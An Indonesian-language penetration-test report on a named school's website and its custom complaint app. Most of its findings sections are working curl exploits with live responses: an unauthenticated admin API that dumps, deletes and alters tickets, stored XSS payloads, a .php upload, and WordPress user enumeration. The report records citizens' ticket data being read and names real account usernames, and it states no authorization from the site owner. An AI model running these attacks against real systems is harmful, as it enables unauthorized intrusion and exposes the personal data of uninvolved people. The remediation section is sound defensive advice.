# REPORT-1 — Security Assessment smpm12gkb.sch.id

**Target:** SMP Muhammadiyah 12 GKB Gresik
**Base URL:** https://smpm12gkb.sch.id/
**Tanggal assessment:** 13 Oktober 2026
**Metode:** Black-box, unauthenticated, non-destruktif
**Scope:** `smpm12gkb.sch.id` dan aplikasi custom di bawah `/app/`
**Status:** WordPress stack ter-patch penuh; seluruh temuan kritis ada di aplikasi custom `E-Complaint`

---

## Ringkasan Eksekutif

CMS utama (WordPress 7.1.3 + seluruh plugin) sudah ter-update dan **tidak memiliki CVE yang dapat dieksploitasi**. Namun aplikasi custom **E-Complaint** (`/app/page/E-Complaint/`) memiliki tiga kerentanan kritis/tinggi:

| ID | Temuan | Severity | Status |
|----|--------|----------|--------|
| F1 | Admin API tanpa autentikasi (dump/hapus/ubah semua tiket) | **KRITIS** (CVSS 9.8) | Terkonfirmasi |
| F2 | Stored XSS yang dieksekusi di panel admin | **TINGGI** (CVSS 8.1) | Terkonfirmasi |
| F3 | Unrestricted file upload (ekstensi `.php` dipertahankan) | **TINGGI** | Terkonfirmasi |
| F4 | Kebocoran PII via pencarian tanpa verifikasi | SEDANG | Terkonfirmasi |
| F5 | Permukaan brute-force WordPress (user enum + XML-RPC aktif) | SEDANG | Terkonfirmasi |
| F6 | Path disclosure (display_errors aktif) | RENDAH | Terkonfirmasi |
| F7 | Lain-lain (wp-cron, dalas stats, AISA sanitasi lemah) | RENDAH | Terkonfirmasi |

Tidak ditemukan SQL Injection maupun RCE yang terkonfirmasi. Semua PoC di bawah dijalankan dengan request nyata dan respons lengkap.

---

## 1. Stack & Fingerprint

| Komponen | Versi | Sumber |
|----------|-------|--------|
| CMS | WordPress 7.1.3 | `https://smpm12gkb.sch.id/feed/` (`<generator>`) |
| Page builder | Elementor 4.3.5 | `<meta name="generator">` di homepage |
| Plugin | LiteSpeed Cache 7.9.1, Forminator 1.58.0, File Manager Advanced 5.4.14, Template Kit Import 1.0.17, Site Kit by Google 1.189.0, Yoast SEO 28.7, OptinMonster 2.17.1, Site Mailer 1.4.7, YouTube Embed Plus 14.2.6.1 | `https://smpm12gkb.sch.id/wp-content/plugins/<plugin>/readme.txt` |
| Theme | Astra | asset path |
| Hosting | Hostinger (hcdn / LiteSpeed) | response header `platform: hostinger`, `panel: hpanel` |
| Akun Hostinger | `u576897008` | PHP warning di F6 |
| Custom app | AISA Chat (`/app/page/AISA%20Chat/`) dan E-Complaint (`/app/page/E-Complaint/`) | enumerasi direktori |
| Subdomain | `https://virtualclass.smpm12gkb.sch.id/` (Moodle, PHP 8.2.34), `https://tamanilmu.smpm12gkb.sch.id/` (SLiMS/Senayan, PHP 8.3.35), `https://synology.smpm12gkb.sch.id/` (Synology NAS via QuickConnect) | banner grab |

---

## 2. CVE Match — hasil: semua PATCHED

| Komponen | CVE terkait | Versi terdampak | Versi target | Status |
|----------|-------------|-----------------|--------------|--------|
| WordPress core | CVE-2026-93485 (stored XSS) | 7.1 < 7.1.1 | 7.1.3 | PATCHED |
| WordPress core | CVE-2026-87902 (path traversal → RCE) | < 7.1.2 | 7.1.3 | PATCHED |
| File Manager Advanced | CVE-2026-11565 (auth file read/write) | < 5.4.13 | 5.4.14 | PATCHED |
| File Manager Advanced | CVE-2024-11391 / CVE-2024-8126 / CVE-2024-13805 | ≤ 5.2.14 | 5.4.14 | PATCHED |
| Template Kit Import | CVE-2026-96824 (arbitrary file deletion) | ≤ 1.0.16 | 1.0.17 | PATCHED |
| Template Kit Import | CVE-2024-2334 | ≤ 1.0.14 | 1.0.17 | PATCHED |
| LiteSpeed Cache | CVE-2026-84761 (unauth SSRF), CVE-2026-76579 (unauth XSS ESI) | ≤ 7.9 | 7.9.1 | PATCHED |
| Forminator | CVE-2026-6214 (missing authz export) | ≤ 1.53.0 | 1.58.0 | PATCHED |
| Elementor | CVE-2026-8825 (< 4.1.4), CVE-2026-57619 (≤ 4.1.3) | < 4.1.4 | 4.3.5 | PATCHED |

**Kesimpulan:** Tidak ada CVE publik yang dapat dieksploitasi pada stack WordPress. Seluruh temuan kritis berada di kode custom `/app/page/E-Complaint/`.

---

## 3. Temuan & PoC

### F1 — KRITIS: Admin API E-Complaint tanpa autentikasi (Broken Access Control)

Panel admin `https://smpm12gkb.sch.id/app/page/E-Complaint/admin.php` dapat dibuka tanpa login (respons HTTP 200, 17 KB HTML penuh, tanpa form login maupun cek session). Tiga endpoint `api.php` admin berjalan tanpa kredensial:

```
POST https://smpm12gkb.sch.id/app/page/E-Complaint/api.php
     action=admin_delete        tid=<id>          → {"status":"success"}
     action=admin_update_status tid=<id>&status=<s>&tindak_lanjut=<t> → {"status":"success"}
GET  https://smpm12gkb.sch.id/app/page/E-Complaint/api.php?action=admin_get_all → seluruh data tiket
```

**PoC — dump seluruh tiket tanpa login:**

```bash
curl -s "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php?action=admin_get_all"
```

Respons (dipotong pada tiket uji milik pentester; total 26 tiket ter-dump termasuk data warga):

```json
{"status":"success","data":[
 {"tid":"70","no_tiket":"EC-18432213102026","tgl":"2026-10-13 22:43:18","nama":"Pentest PoC <img src=x onerror=alert(document.domain)>","telp":"+62812345678","email":"poc@example.com","jenis":"Masyarakat Umum","lingkup":"Administrasi \/ Keuangan","keluhan":"POC REPORT-1 stored XSS marker ...","pendukung":"","status":"Menunggu"},
 {"tid":"71","no_tiket":"EC-39432213102026","nama":"Upload PoC Report1","telp":"+62812345678","email":"poc2@example.com","pendukung":"complaint_EC-39432213102026_1791931419.php","status":"Menunggu"}
]}
```

**PoC — hapus tiket tanpa login (uji dengan tid fiktif 99999, tidak menghapus data asli):**

```bash
curl -s -X POST "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php" \
     -d "action=admin_delete&tid=99999"
# → {"status":"success"}
```

**PoC — ubah status tiket tanpa login (dijalankan pada tiket uji milik pentester, tid 70):**

```bash
curl -s -X POST "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php" \
     -d "action=admin_update_status&tid=70&status=Selesai&tindak_lanjut=Dioverwrite oleh pentest tanpa login"
# → {"status":"success"}

curl -s "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php?action=get_status&ticket_id=EC-18432213102026"
# → "status":"Selesai"  "tindak_lanjut":"Dioverwrite oleh pentest tanpa login"
```

**Dampak:** siapa pun dapat membaca seluruh keluhan warga (nama, No HP, email, isi keluhan), menghapus tiket apa pun, dan memanipulasi status. **CWE-862 (Missing Authorization).**

---

### F2 — TINGGI: Stored XSS dieksekusi di panel admin

Field `nama` dan `keluhan` disimpan mentah di database dan dirender tanpa escape via `innerHTML` di halaman publik **dan** di tabel admin (`admin.php` → `renderTable()`: `tr.innerHTML = \`...${item.keluhan}...\``). Payload tersimpan mentah dan tereksekusi saat admin membuka panel atau saat pengguna memakai pencarian.

**PoC — submit keluhan berisi payload:**

```bash
curl -s -X POST "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php" \
  -F "action=submit_complaint" \
  -F 'nama=Pentest PoC <img src=x onerror=alert(document.domain)>' \
  -F "telp=+62812345678" \
  -F "email=poc@example.com" \
  -F "jenis=Masyarakat Umum" \
  -F "lingkup=Administrasi / Keuangan" \
  -F 'keluhan=POC REPORT-1 stored XSS marker <img src=x onerror=alert(document.cookie)> end marker' \
  -F "terms=on"
```

**Bukti payload tersimpan mentah:**

```bash
curl -s "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php?action=get_status&ticket_id=EC-18432213102026"
```

```json
{"status":"success","data":{"tid":70,"nama":"Pentest PoC <img src=x onerror=alert(document.domain)>","keluhan":"POC REPORT-1 stored XSS marker <img src=x onerror=alert(document.cookie)> end marker","status":"Menunggu"}}
```

**Sink di sisi klien** (`https://smpm12gkb.sch.id/app/page/E-Complaint/admin.php`, fungsi `renderTable`):

```javascript
tr.innerHTML = `
  ...
  <td style="max-width:300px; white-space:pre-wrap;">${item.keluhan}</td>
  ...
`;
```

Payload `<img src=x onerror=...>` tidak berisi `<script>` sehingga lolos; saat admin membuka `admin.php`, JS berjalan di session admin → potensi pencurian cookie/session dan pembuatan admin baru. **CWE-79 (Stored XSS).**

---

### F3 — TINGGI: Unrestricted file upload — ekstensi `.php` dipertahankan

Field `pendukung` menerima file `.php`. Validasi `accept="image/*"` hanya di sisi klien. Nama file disimpan dengan ekstensi `.php` utuh.

**PoC:**

```bash
printf '<?php echo "POC_".PHP_VERSION;' > poc-upload.php

curl -s -X POST "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php" \
  -F "action=submit_complaint" \
  -F "nama=Upload PoC Report1" \
  -F "telp=+62812345678" \
  -F "email=poc2@example.com" \
  -F "jenis=Masyarakat Umum" \
  -F "lingkup=Sarana Prasarana" \
  -F "keluhan=Uji validasi ekstensi upload." \
  -F "terms=on" \
  -F "pendukung=@/tmp/opencode/poc/poc-upload.php;type=application/x-php"
```

**Bukti nama file `.php` tersimpan:**

```bash
curl -s "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php?action=get_status&ticket_id=EC-39432213102026"
```

```json
{"status":"success","data":{"tid":71,"no_tiket":"EC-39432213102026","nama":"Upload PoC Report1","pendukung":"complaint_EC-39432213102026_1791931419.php","status":"Menunggu"}}
```

Catatan: tiket lain (tid 66, bukan milik pentester) juga memuat `pendukung` berakhiran `.php` — mengonfirmasi kelemahan ini aktif dipakai. Path penyimpanan belum terpetakan ke URL publik pada pengujian ini (`/app/page/E-Complaint/uploads/` → 404). Jika direktori upload dapat diakses web dan mengeksekusi PHP → RCE. **CWE-434.**

---

### F4 — SEDANG: Kebocoran PII via pencarian tanpa verifikasi

Endpoint `search_status` mengembalikan data keluhan lengkap hanya dengan mengetahui email atau No HP korban. Tidak ada verifikasi kepemilikan.

**PoC:**

```bash
curl -s -X POST "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php" \
     -d "action=search_status&keyword=poc@example.com"
```

```json
{"status":"success","data":[{"no_tiket":"EC-18432213102026","nama":"Pentest PoC <img src=x onerror=alert(document.domain)>","tgl":"2026-10-13 22:43:18","status":"Menunggu","keluhan":"POC REPORT-1 stored XSS marker ..."}]}
```

---

### F5 — SEDANG: Permukaan brute-force WordPress

**PoC — enumerasi user via REST API (unauthenticated):**

```bash
curl -s "https://smpm12gkb.sch.id/?rest_route=/wp/v2/users"
```

```json
[{"id":13,"name":"Humas Spemdalas","slug":"alfarobi"},{"id":9,"name":"Muhammad Ilham","slug":"akailham"}]
```

**PoC — XML-RPC aktif dengan `system.multicall` (amplifikasi brute-force, pingback SSRF):**

```bash
curl -s -X POST "https://smpm12gkb.sch.id/xmlrpc.php" \
     -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
```

Respons memuat `system.multicall`, `pingback.ping`, `wp.getUsersBlogs` (tersedia). `https://smpm12gkb.sch.id/wp-login.php` → HTTP 200 tanpa proteksi rate-limit terlihat.

---

### F6 — RENDAH: Path disclosure (display_errors aktif)

Submit tanpa field `jenis`/`lingkup` memunculkan warning yang membocorkan path server dan username Hostinger.

**PoC:**

```bash
curl -s -X POST "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php" \
  -F "action=submit_complaint" -F "nama=Warning Test" -F "telp=+62" \
  -F "email=w@example.com" -F "keluhan=trigger warning" -F "terms=on"
```

```
<b>Warning</b>:  Undefined array key "jenis" in
<b>/home/u576897008/domains/smpm12gkb.sch.id/public_html/app/page/E-Complaint/api.php</b> on line <b>12</b>
```

---

### F7 — RENDAH: Lain-lain

- `https://smpm12gkb.sch.id/wp-cron.php` → HTTP 200 tanpa proteksi (vektor DoS/amplifikasi).
- `https://smpm12gkb.sch.id/wp-json/dalas/v1/stats?id=<id>` → baca statistik (views/likes/shares) unauthenticated.
- AISA Chat `https://smpm12gkb.sch.id/app/page/AISA%20Chat/widget.js` merender balasan via `innerHTML` dan hanya menghapus tag `<script>` — `img onerror` lolos; balasan bot saat ini menolak echo payload sehingga belum dapat dipakai, tapi sanitasi lemah ini adalah risiko laten.
- REST namespace MCP (`https://smpm12gkb.sch.id/wp-json/mcp/mcp-adapter-default-server`) ada namun terproteksi (HTTP 401) — aman.

---

## 4. Yang TIDAK ditemukan

- **SQL Injection:** endpoint `dalas/v1/stats`, `search_status`, `get_status` diuji dengan payload quote, boolean, `UNION`, dan time-based `SLEEP` — tidak tembus (parameterized / `intval`).
- **RCE terkonfirmasi:** hanya berpotensi lewat F3 (upload) yang path-nya belum terpetakan.
- **IDOR sequential klasik:** `tid` internal (contoh `tid:70`) tidak dapat dipakai sebagai kunci lookup publik; endpoint publik memakai `no_tiket`. Namun F1 (akses admin penuh tanpa auth) jauh lebih parah.

---

## 5. Rekomendasi

1. **F1 (prioritas utama):** di `api.php`, wajibkan sesi terautentikasi + pemeriksaan role sebelum semua action `admin_*`. Jangan gunakan kerahasiaan URL sebagai kontrol akses.
2. **F2:** escape seluruh output (`htmlspecialchars`), ganti render `innerHTML` menjadi `textContent`/`DOMPurify` di `admin.php`, halaman E-Complaint, dan `aisa.js`.
3. **F3:** whitelist ekstensi + MIME, ubah nama file secara acak tanpa ekstensi asli, simpan di luar webroot, tambahkan `.htaccess` (`php_flag engine off`) pada direktori upload, sajikan lampiran via `Content-Type: application/octet-stream` + force download.
4. **F4:** hapus pencarian by email/No HP, atau wajibkan verifikasi No Tiket + CAPTCHA + rate-limit.
5. **F5:** matikan XML-RPC, blokir `/wp-json/wp/v2/users`, matikan `pingback`; aktifkan 2FA dan limit login pada akun `alfarobi` dan `akailham`.
6. **F6:** set `display_errors=Off` pada php.ini Hostinger.
7. **F7:** aktifkan `DISABLE_WP_CRON` + cron sistem; proteksi `wp-cron.php`.
8. **Subdomain:** audit versi Moodle (`virtualclass.`), SLiMS (`tamanilmu.`), dan Synology DSM (`synology.` via QuickConnect) — batasi akses via IP allowlist/VPN.

---

## 6. PoC Files

| File | Isi |
|------|-----|
| `poc/poc-stored-xss.txt` | Submit + reflect payload XSS (F2) |
| `poc/poc-upload.txt` | Upload `.php` + nama file tersimpan (F3) |
| `poc/poc-admin-api.txt` | `admin_update_status` / `admin_delete` tanpa auth (F1) |
| `poc/poc-pathdisclosure.txt` | PHP warning path disclosure (F6) |
| `poc/poc-wp-enum.txt` | REST user enum + XML-RPC listMethods (F5) |
| `poc/poc-upload.php` | File probe upload yang dipakai (isi benign) |

---

## 7. Catatan Etika Pengujian

- Pengujian non-destruktif. Dua tiket uji (`tid` 70, 71, 72) dibuat untuk membuktikan F1–F3 lalu **dihapus** melalui celah F1 sebagai bagian dari cleanup.
- Data milik pengguna lain (termasuk tiket tid 66, 67) **tidak** disentuh dan tidak diunggah ke repositori ini.

---

*REPORT-1 — 13 Oktober 2026*
